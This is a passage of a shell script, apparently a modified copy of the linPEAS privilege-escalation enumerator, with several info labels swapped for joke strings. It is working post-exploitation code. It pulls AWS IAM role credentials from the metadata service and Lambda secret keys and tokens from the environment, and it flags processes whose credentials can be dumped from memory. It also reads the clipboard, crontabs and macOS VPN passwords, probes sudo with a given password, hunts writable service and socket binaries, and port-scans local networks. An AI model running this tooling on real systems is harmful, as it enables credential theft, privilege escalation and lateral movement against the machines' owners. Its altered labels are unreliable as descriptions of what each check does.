          echo ""
        done

        echo ""
        print_3title "IAM Role"
        exec_with_jq eval $aws_req "$URL/iam/info"; echo ""
        for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
          echo "Role: $role"
          exec_with_jq eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
          echo ""
        done
        
        echo ""
        print_3title "User Data"
        eval $aws_req "http://169.254.169.254/latest/user-data"
    fi
fi

if [ "$is_aws_lambda" = "Yes" ]; then
  print_2title "AWS Lambda Enumeration"
  printf "Function name: "; env | grep AWS_LAMBDA_FUNCTION_NAME
  printf "Region: "; env | grep AWS_REGION
  printf "Secret Access Key: "; env | grep AWS_SECRET_ACCESS_KEY
  printf "Access Key ID: "; env | grep AWS_ACCESS_KEY_ID
  printf "Session token: "; env | grep AWS_SESSION_TOKEN
  printf "Security token: "; env | grep AWS_SECURITY_TOKEN
  printf "Runtime API: "; env | grep AWS_LAMBDA_RUNTIME_API
  printf "Event data: "; (curl -s "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next" 2>/dev/null || wget -q -O - "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next")
fi


fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets; then
print_title "Processes, Crons, Timers, Services and Sockets"


if ! [ "$SEARCH_IN_FOLDER" ]; then

  print_2title "Cleaned processes"
  if [ "$NOUSEPS" ]; then
    printf ${BLUE}"[i]$GREEN Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
  fi
  print_info "esprocesseskis"

  if [ "$NOUSEPS" ]; then
    print_ps | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
    pslist=$(print_ps)
  else
    (ps fauxwww || ps auxwww | sort ) 2>/dev/null | grep -v "\[" | grep -v "%CPU" | while read psline; do
      echo "$psline"  | sed -${E} "s,$Wfolders,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED}," | sed -${E} "s,$processesVB,${SED_RED_YELLOW},g" | sed "s,$processesB,${SED_RED}," | sed -${E} "s,$processesDump,${SED_RED},"
      if [ "$(command -v capsh)" ] && ! echo "$psline" | grep -q root; then
        cpid=$(echo "$psline" | awk '{print $2}')
        caphex=0x"$(cat /proc/$cpid/status 2> /dev/null | grep CapEff | awk '{print $2}')"
        if [ "$caphex" ] && [ "$caphex" != "0x" ] && echo "$caphex" | grep -qv '0x0000000000000000'; then
          printf "  └─(${DG}Caps${NC}) "; capsh --decode=$caphex 2>/dev/null | grep -v "WARNING:" | sed -${E} "s,$capsB,${SED_RED},g"
        fi
      fi
    done
    pslist=$(ps auxwww)
    echo ""


    print_2title "Binary processes permissions (non root root and not belonging to current user)"
    print_info "01processesseseseses"
    binW="IniTialiZZinnggg"
    ps auxwww 2>/dev/null | awk '{print $11}' | while read bpath; do
      if [ -w "$bpath" ]; then
        binW="$binW|$bpath"
      fi
    done
    ps auxwww 2>/dev/null | awk '{print $11}' | xargs ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | grep -v " root root " | grep -v " $USER " | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$binW,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_RED}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_RED}," | sed "s,root,${SED_GREEN},"
  fi
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  if ! [ "$IAMROOT" ]; then
    print_2title "Files opened by processes belonging to other users"
    print_info "This is usually empty because of the lack of privileges to read other user processes information"
    lsof 2>/dev/null | grep -v "$USER" | grep -iv "permission denied" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  print_2title "Processes with credentials in memory (root req)"
  print_info "lookie in memori"
  if echo "$pslist" | grep -q "gdm-password"; then echo "gdm-password process found (dump creds from memory as root)" | sed "s,gdm-password process,${SED_RED},"; else echo_not_found "gdm-password"; fi
  if echo "$pslist" | grep -q "gnome-keyring-daemon"; then echo "gnome-keyring-daemon process found (dump creds from memory as root)" | sed "s,gnome-keyring-daemon,${SED_RED},"; else echo_not_found "gnome-keyring-daemon"; fi
  if echo "$pslist" | grep -q "lightdm"; then echo "lightdm process found (dump creds from memory as root)" | sed "s,lightdm,${SED_RED},"; else echo_not_found "lightdm"; fi
  if echo "$pslist" | grep -q "vsftpd"; then echo "vsftpd process found (dump creds from memory as root)" | sed "s,vsftpd,${SED_RED},"; else echo_not_found "vsftpd"; fi
  if echo "$pslist" | grep -q "apache2"; then echo "apache2 process found (dump creds from memory as root)" | sed "s,apache2,${SED_RED},"; else echo_not_found "apache2"; fi
  if echo "$pslist" | grep -q "sshd:"; then echo "sshd: process found (dump creds from memory as root)" | sed "s,sshd:,${SED_RED},"; else echo_not_found "sshd"; fi
  echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
    print_2title "Different processes executed during 1 min (interesting is low number of repetitions)"
    print_info "these work too hard"
    temp_file=$(mktemp)
    if [ "$(ps -e -o command 2>/dev/null)" ]; then for i in $(seq 1 1250); do ps -e -o command >> "$temp_file" 2>/dev/null; sleep 0.05; done; sort "$temp_file" 2>/dev/null | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort -r -n | grep -E -v "\s*[1-9][0-9][0-9][0-9]"; rm "$temp_file"; fi
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  print_2title "Cron jobs"
  print_info "shift work"
  command -v crontab 2>/dev/null || echo_not_found "crontab"
  crontab -l 2>/dev/null | tr -d "\r" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed "s,root,${SED_RED},"
  command -v incrontab 2>/dev/null || echo_not_found "incrontab"
  incrontab -l 2>/dev/null
  ls -alR /etc/cron* /var/spool/cron/crontabs /var/spool/anacron 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g"
  cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/* /etc/incron.d/* /var/spool/incron/* 2>/dev/null | tr -d "\r" | grep -v "^#" | sed -${E} "s,$Wfolders,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,$nosh_usrs,${SED_BLUE},"  | sed "s,root,${SED_RED},"
  crontab -l -u "$USER" 2>/dev/null | tr -d "\r"
  ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /var/at/tabs/ /etc/periodic/ 2>/dev/null | sed -${E} "s,$cronjobsG,${SED_GREEN},g" | sed "s,$cronjobsB,${SED_RED},g" 
  atq 2>/dev/null
else
  print_2title "Cron jobs"
  print_info "shift workers"
  find "$SEARCH_IN_FOLDER" '(' -type d -or -type f ')' '(' -name "cron*" -or -name "anacron" -or -name "anacrontab" -or -name "incron.d" -or -name "incron" -or -name "at" -or -name "periodic" ')' -exec echo {} \; -exec ls -lR {} \;
fi
echo ""


if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$MACPEAS" ]; then
    print_2title "Third party LaunchAgents & LaunchDemons"
    print_info "DEMONS"
    ls -l /Library/LaunchAgents/ /Library/LaunchDaemons/ ~/Library/LaunchAgents/ ~/Library/LaunchDaemons/ 2>/dev/null
    echo ""

    print_2title "Writable System LaunchAgents & LaunchDemons"
    find /System/Library/LaunchAgents/ /System/Library/LaunchDaemons/ /Library/LaunchAgents/ /Library/LaunchDaemons/ | grep ".plist" | while read f; do
      program=""
      program=$(defaults read "$f" Program 2>/dev/null)
      if ! [ "$program" ]; then
        program=$(defaults read /Library/LaunchDaemons/MonitorHelper.plist ProgramArguments | grep -Ev "^\(|^\)" | cut -d '"' -f 2)
      fi
      if [ -w "$program" ]; then
        echo "$program" is writable | sed -${E} "s,.*,${SED_RED_YELLOW},";
      fi
    done
    echo ""

    print_2title "StartupItems"
    print_info "Rise and Shine"
    ls -l /Library/StartupItems/ /System/Library/StartupItems/ 2>/dev/null
    echo ""

    print_2title "Login Items"
    print_info "Only if told to"
    osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null
    echo ""

    print_2title "SPStartupItemDataType"
    system_profiler SPStartupItemDataType
    echo ""

    print_2title "Emond scripts"
    print_info "idk emond lmao"
    ls -l /private/var/db/emondClients
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  if [ "$EXTRA_CHECKS" ]; then
    print_2title "Services"
    print_info "Looking for the elderly"
    (service --status-all || service -e || chkconfig --list || rc-status || launchctl list) 2>/dev/null || echo_not_found "service|chkconfig|rc-status|launchctl"
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  print_2title "Systemd PATH"
  print_info "PAFF"
  systemctl show-environment 2>/dev/null | grep "PATH" | sed -${E} "s,$Wfolders\|\./\|\.:\|:\.,${SED_RED_YELLOW},g"
  WRITABLESYSTEMDPATH=$(systemctl show-environment 2>/dev/null | grep "PATH" | grep -E "$Wfolders")
  echo ""
fi

print_2title "Analyzing .service files"
print_info "something about correct catering practice"
printf "%s\n" "$PSTORAGE_SYSTEMD" | while read s; do
  if [ ! -O "$s" ] || [ "$SEARCH_IN_FOLDER" ]; then 
    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
      echo "$s" | sed -${E} "s,.*,${SED_RED_YELLOW},g"
    fi
    servicebinpaths=$(grep -Eo '^Exec.*?=[!@+-]*[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
    printf "%s\n" "$servicebinpaths" | while read sp; do
      if [ -w "$sp" ]; then
        echo "$s is calling this writable executable: $sp" | sed "s,writable.*,${SED_RED_YELLOW},g"
      fi
    done
    relpath1=$(grep -E '^Exec.*=(?:[^/]|-[^/]|\+[^/]|![^/]|!![^/]|)[^/@\+!-].*' "$s" 2>/dev/null | grep -Iv "=/")
    relpath2=$(grep -E '^Exec.*=.*/bin/[a-zA-Z0-9_]*sh ' "$s" 2>/dev/null | grep -Ev "/[a-zA-Z0-9_]+/")
    if [ "$relpath1" ] || [ "$relpath2" ]; then
      if [ "$WRITABLESYSTEMDPATH" ]; then
        echo "$s is executing some relative path" | sed -${E} "s,.*,${SED_RED},";
      else
        echo "$s is executing some relative path"
      fi
    fi
  fi
done
if [ ! "$WRITABLESYSTEMDPATH" ]; then echo "You cant write on systemd PATH" | sed -${E} "s,.*,${SED_GREEN},"; fi
echo ""
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then

  print_2title "System timers"
  print_info "peaking"
  (systemctl list-timers --all 2>/dev/null | grep -Ev "(^$|timers listed)" | sed -${E} "s,$timersG,${SED_GREEN},") || echo_not_found
  echo ""
fi


print_2title "Analyzing .timer files"
print_info "peaking dot files"
printf "%s\n" "$PSTORAGE_TIMER" | while read t; do
  if ! [ "$IAMROOT" ] && [ -w "$t" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
    echo "$t" | sed -${E} "s,.*,${SED_RED},g"
  fi
  timerbinpaths=$(grep -Po '^Unit=*(.*?$)' $t 2>/dev/null | cut -d '=' -f2)
  printf "%s\n" "$timerbinpaths" | while read tb; do
    if [ -w "$tb" ]; then
      echo "$t timer is calling this writable executable: $tb" | sed "s,writable.*,${SED_RED},g"
    fi
  done
  
done
echo ""

if ! [ "$IAMROOT" ]; then
  print_2title "Analyzing .socket files"
  print_info "wrench sockets"
  printf "%s\n" "$PSTORAGE_SOCKET" | while read s; do
    if ! [ "$IAMROOT" ] && [ -w "$s" ] && [ -f "$s" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
      echo "Writable .socket file: $s" | sed "s,/.*,${SED_RED},g"
    fi
    socketsbinpaths=$(grep -Eo '^(Exec).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
    printf "%s\n" "$socketsbinpaths" | while read sb; do
      if [ -w "$sb" ]; then
        echo "$s is calling this writable executable: $sb" | sed "s,writable.*,${SED_RED},g"
      fi
    done
    socketslistpaths=$(grep -Eo '^(Listen).*?=[!@+-]*/[a-zA-Z0-9_/\-]+' "$s" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,')
    printf "%s\n" "$socketslistpaths" | while read sl; do
      if [ -w "$sl" ]; then
        echo "$s is calling this writable listener: $sl" | sed "s,writable.*,${SED_RED},g";
      fi
    done
  done
  echo ""
  
  if ! [ "$SEARCH_IN_FOLDER" ]; then
    print_2title "Unix Sockets Listening"
    print_info "those other wrench sockets"

    unix_scks_list=$(ss -xlp -H state listening 2>/dev/null | grep -Eo "/.* " | cut -d " " -f1)
    if ! [ "$unix_scks_list" ];then
      unix_scks_list=$(ss -l -p -A 'unix' 2>/dev/null | grep -Ei "listen|Proc" | grep -Eo "/[a-zA-Z0-9\._/\-]+")
    fi
    if ! [ "$unix_scks_list" ];then
      unix_scks_list=$(netstat -a -p --unix 2>/dev/null | grep -Ei "listen|PID" | grep -Eo "/[a-zA-Z0-9\._/\-]+" | tail -n +2)
    fi
  fi
  
  if ! [ "$SEARCH_IN_FOLDER" ]; then

    unix_scks_list2=$(find / -type s 2>/dev/null)
  else
    unix_scks_list2=$(find "SEARCH_IN_FOLDER" -type s 2>/dev/null)
  fi

  (printf "%s\n" "$unix_scks_list" && printf "%s\n" "$unix_scks_list2") | sort | uniq | while read l; do
    perms=""
    if [ -r "$l" ]; then
      perms="Read "
    fi
    if [ -w "$l" ];then
      perms="${perms}Write"
    fi
    
    if [ "$EXTRA_CHECKS" ] && [ "$(command -v curl)" ]; then
      CANNOT_CONNECT_TO_SOCKET="$(curl -v --unix-socket "$l" --max-time 1 http:/linpeas 2>&1 | grep -i 'Permission denied')"
      if ! [ "$CANNOT_CONNECT_TO_SOCKET" ]; then
        perms="${perms} - Can Connect"
      else
        perms="${perms} - Cannot Connect"
      fi
    fi
    
    if ! [ "$perms" ]; then echo "$l" | sed -${E} "s,$l,${SED_GREEN},g";
    else 
      echo "$l" | sed -${E} "s,$l,${SED_RED},g"
      echo "  └─(${RED}${perms}${NC})" | sed -${E} "s,Cannot Connect,${SED_GREEN},g"
      socketcurl=$(curl --max-time 2 --unix-socket "$s" http:/index 2>/dev/null)
      if [ $? -eq 0 ]; then
        owner=$(ls -l "$s" | cut -d ' ' -f 3)
        echo "Socket $s owned by $owner uses HTTP. Response to /index: (limt 30)" | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
        echo "$socketcurl" | head -n 30
      fi
    fi
  done
  echo ""
fi

print_2title "D-Bus config files"
print_info "DeBuss-fig"
if [ "$PSTORAGE_DBUS" ]; then
  printf "%s\n" "$PSTORAGE_DBUS" | while read d; do
    for f in $d/*; do
      if ! [ "$IAMROOT" ] && [ -w "$f" ] && ! [ "$SEARCH_IN_FOLDER" ]; then
        echo "Writable $f" | sed -${E} "s,.*,${SED_RED},g"
      fi

      genpol=$(grep "<policy>" "$f" 2>/dev/null)
      if [ "$genpol" ]; then printf "Weak general policy found on $f ($genpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi

      userpol=$(grep "<policy user=" "$f" 2>/dev/null | grep -v "root")
      if [ "$userpol" ]; then printf "Possible weak user policy found on $f ($userpol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi
      
      grppol=$(grep "<policy group=" "$f" 2>/dev/null | grep -v "root")
      if [ "$grppol" ]; then printf "Possible weak user policy found on $f ($grppol)\n" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_RED},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$mygroups,${SED_RED},g"; fi

    done
  done
fi
echo ""

if ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "D-Bus Service Objects list"
  print_info "Public Transport Service Objects"
  dbuslist=$(busctl list 2>/dev/null)
  if [ "$dbuslist" ]; then
    busctl list | while read line; do
      echo "$line" | sed -${E} "s,$dbuslistG,${SED_GREEN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$rootcommon,${SED_GREEN}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed "s,$USER,${SED_LIGHT_MAGENTA}," | sed "s,root,${SED_RED},";
      if ! echo "$line" | grep -qE "$dbuslistG"; then
        srvc_object=$(echo $line | cut -d " " -f1)
        srvc_object_info=$(busctl status "$srvc_object" 2>/dev/null | grep -E "^UID|^EUID|^OwnerUID" | tr '\n' ' ')
        if [ "$srvc_object_info" ]; then
          echo " -- $srvc_object_info" | sed "s,UID=0,${SED_RED},"
        fi
      fi
    done
  else echo_not_found "busctl"
  fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q network_information; then
print_title "Network Information"


if [ "$MACOS" ]; then
  print_2title "Network Capabilities"
  warn_exec system_profiler SPNetworkDataType
  echo ""
fi

print_2title "Hostname, hosts and DNS"
cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null
warn_exec dnsdomainname 2>/dev/null
echo ""

if [ "$EXTRA_CHECKS" ]; then
  print_2title "Content of /etc/inetd.conf & /etc/xinetd.conf"
  (cat /etc/inetd.conf /etc/xinetd.conf 2>/dev/null | grep -v "^$" | grep -Ev "\W+\#|^#" 2>/dev/null) || echo_not_found "/etc/inetd.conf"
  echo ""
fi

print_2title "Interfaces"
cat /etc/networks 2>/dev/null
(ifconfig || ip a) 2>/dev/null
echo ""

if [ "$EXTRA_CHECKS" ]; then
  print_2title "Networks and neighbours"
  if [ "$MACOS" ]; then
    netstat -rn 2>/dev/null
  else
    (route || ip n || cat /proc/net/route) 2>/dev/null
  fi
  (arp -e || arp -a || cat /proc/net/arp) 2>/dev/null
  echo ""
fi

if [ "$MACPEAS" ]; then
  print_2title "Firewall status"
  warn_exec system_profiler SPFirewallDataType
fi

if [ "$EXTRA_CHECKS" ]; then
  print_2title "Iptables rules"
  (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Ev "\W+\#|^#" 2>/dev/null) 2>/dev/null || echo_not_found "iptables rules"
  echo ""
fi

print_2title "Active Ports"
print_info "active wrench sockets"
( (netstat -punta || ss -nltpu || netstat -anv) | grep -i listen) 2>/dev/null | sed -${E} "s,127.0.[0-9]+.[0-9]+|:::|::1:|0\.0\.0\.0,${SED_RED},"
echo ""

if [ "$MACPEAS" ] && [ "$EXTRA_CHECKS" ]; then
  print_2title "Hardware Ports"
  networksetup -listallhardwareports
  echo ""

  print_2title "VLANs"
  networksetup -listVLANs
  echo ""

  print_2title "Wifi Info"
  networksetup -getinfo Wi-Fi
  echo ""

  print_2title "Check Enabled Proxies"
  scutil --proxy
  echo ""

  print_2title "Wifi Proxy URL"
  networksetup -getautoproxyurl Wi-Fi
  echo ""
  
  print_2title "Wifi Web Proxy"
  networksetup -getwebproxy Wi-Fi
  echo ""

  print_2title "Wifi FTP Proxy"
  networksetup -getftpproxy Wi-Fi
  echo ""
fi

print_2title "Can I sniff with tcpdump?"
timeout 1 tcpdump >/dev/null 2>&1
if [ $? -eq 124 ]; then
    print_info "link"
    echo "You can sniff with tcpdump!" | sed -${E} "s,.*,${SED_RED},"
else echo_no
fi
echo ""

if [ "$AUTO_NETWORK_SCAN" ] && [ "$TIMEOUT" ] && [ -f "/bin/bash" ]; then
  print_2title "Internet Access?"
  check_tcp_80 2>/dev/null &
  check_tcp_443 2>/dev/null &
  check_icmp 2>/dev/null &
  check_dns 2>/dev/null &
  wait
  echo ""
fi

if [ "$AUTO_NETWORK_SCAN" ]; then
  if ! [ "$FOUND_NC" ] && ! [ "$FOUND_BASH" ]; then
    printf $RED"[-] $SCAN_BAN_BAD\n$NC"
    echo "The network is not going to be scanned..."
  
  elif ! [ "$(command -v ifconfig)" ] && ! [ "$(command -v ip a)" ]; then
    printf $RED"[-] No ifconfig or ip commands, cannot find local ips\n$NC"
    echo "The network is not going to be scanned..."
  
  else
    print_2title "Scanning local networks (using /24)"

    if ! [ "$PING" ] && ! [ "$FPING" ]; then
      printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
    fi

    select_nc
    local_ips=$( (ip a 2>/dev/null || ifconfig) | grep -Eo 'inet[^6]\S+[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | awk '{print $2}' | grep -E "^10\.|^172\.|^192\.168\.|^169\.254\.")
    printf "%s\n" "$local_ips" | while read local_ip; do
      if ! [ -z "$local_ip" ]; then
        print_3title "Discovering hosts in $local_ip/24"
        
        if [ "$PING" ] || [ "$FPING" ]; then
          discover_network "$local_ip/24" | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Network Discovery" | grep -v "Network Discovery" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $Wfolder/.ips.tmp
        fi
        
        discovery_port_scan "$local_ip/24" 22 | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | grep -A 256 "Ports going to be scanned" | grep -v "Ports going to be scanned" | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >> $Wfolder/.ips.tmp
        
        sort $Wfolder/.ips.tmp | uniq > $Wfolder/.ips
        rm $Wfolder/.ips.tmp 2>/dev/null
        
        while read disc_ip; do
          me=""
          if [ "$disc_ip" = "$local_ip" ]; then
            me=" (local)"
          fi
          
          echo "Scanning top ports of ${disc_ip}${me}"
          (tcp_port_scan "$disc_ip" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
          echo ""
        done < $Wfolder/.ips
        
        rm $Wfolder/.ips 2>/dev/null
        echo ""
      fi
    done
    
    print_3title "Scanning top ports of host.docker.internal"
    (tcp_port_scan "host.docker.internal" "" | grep -A 1000 "Ports going to be scanned" | grep -v "Ports going to be scanned" | sort | uniq) 2>/dev/null
    echo ""
  fi
fi

if [ "$MACOS" ]; then
  print_2title "Any MacOS Sharing Service Enabled?"
  rmMgmt=$(netstat -na | grep LISTEN | grep tcp46 | grep "*.3283" | wc -l);
  scrShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.5900" | wc -l);
  flShrng=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep -E "\*.88|\*.445|\*.548" | wc -l);
  rLgn=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.22" | wc -l);
  rAE=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.3031" | wc -l);
  bmM=$(netstat -na | grep LISTEN | grep -E 'tcp4|tcp6' | grep "*.4488" | wc -l);
  printf "\nThe following services are OFF if '0', or ON otherwise:\nScreen Sharing: %s\nFile Sharing: %s\nRemote Login: %s\nRemote Mgmt: %s\nRemote Apple Events: %s\nBack to My Mac: %s\n\n" "$scrShrng" "$flShrng" "$rLgn" "$rmMgmt" "$rAE" "$bmM";
  echo ""
  print_2title "VPN Creds"
  system_profiler SPNetworkLocationDataType | grep -A 5 -B 7 ": Password"  | sed -${E} "s,Password|Authorization Name.*,${SED_RED},"
  echo ""

  if [ "$EXTRA_CHECKS" ]; then
    print_2title "Bluetooth Info"
    warn_exec system_profiler SPBluetoothDataType
    echo ""

    print_2title "Ethernet Info"
    warn_exec system_profiler SPEthernetDataType
    echo ""

    print_2title "USB Info"
    warn_exec system_profiler SPUSBDataType
    echo ""
  fi
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q users_information; then
print_title "Users Information"

print_2title "My user"
print_info "users get high"
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed "s,root,${SED_RED}," | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed -${E} "s,$idB,${SED_RED},g"
echo ""

if [ "$MACPEAS" ];then
  print_2title "Current user Login and Logout hooks"
  defaults read $HOME/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  echo ""

  print_2title "All Login and Logout hooks"
  defaults read /Users/*/Library/Preferences/com.apple.loginwindow.plist 2>/dev/null | grep -e "Hook"
  defaults read /private/var/root/Library/Preferences/com.apple.loginwindow.plist
  echo ""

  print_2title "Keychains"
  print_info "who cares lol"
  security list-keychains
  echo ""

  print_2title "SystemKey"
  ls -l /var/db/SystemKey
  if [ -r "/var/db/SystemKey" ]; then 
    echo "You can read /var/db/SystemKey" | sed -${E} "s,.*,${SED_RED_YELLOW},";
    hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey | sed -${E} "s,.*,${SED_RED_YELLOW},";
  fi
  echo ""
fi

print_2title "Do I have PGP keys?"
command -v gpg 2>/dev/null || echo_not_found "gpg"
gpg --list-keys 2>/dev/null
command -v netpgpkeys 2>/dev/null || echo_not_found "netpgpkeys"
netpgpkeys --list-keys 2>/dev/null
command -v netpgp 2>/dev/null || echo_not_found "netpgp"
echo ""

if [ "$(command -v xclip 2>/dev/null)" ] || [ "$(command -v xsel 2>/dev/null)" ] || [ "$(command -v pbpaste 2>/dev/null)" ] || [ "$DEBUG" ]; then
  print_2title "Clipboard or highlighted text?"
  if [ "$(command -v xclip 2>/dev/null)" ]; then
    echo "Clipboard: "$(xclip -o -selection clipboard 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xclip -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v xsel 2>/dev/null)" ]; then
    echo "Clipboard: "$(xsel -ob 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
    echo "Highlighted text: "$(xsel -o 2>/dev/null) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  elif [ "$(command -v pbpaste 2>/dev/null)" ]; then
    echo "Clipboard: "$(pbpaste) | sed -${E} "s,$pwd_inside_history,${SED_RED},"
  else echo_not_found "xsel and xclip"
  fi
  echo ""
fi

print_2title "Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d"
print_info "sometimes doers"
(echo '' | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g" | sed "s,\!root,${SED_RED},") 2>/dev/null || echo_not_found "sudo"
if [ "$PASSWORD" ]; then
  (echo "$PASSWORD" | timeout 1 sudo -S -l | sed "s,_proxy,${SED_RED},g" | sed "s,$sudoG,${SED_GREEN},g" | sed -${E} "s,$sudoVB1,${SED_RED_YELLOW}," | sed -${E} "s,$sudoVB2,${SED_RED_YELLOW}," | sed -${E} "s,$sudoB,${SED_RED},g") 2>/dev/null  || echo_not_found "sudo"
fi
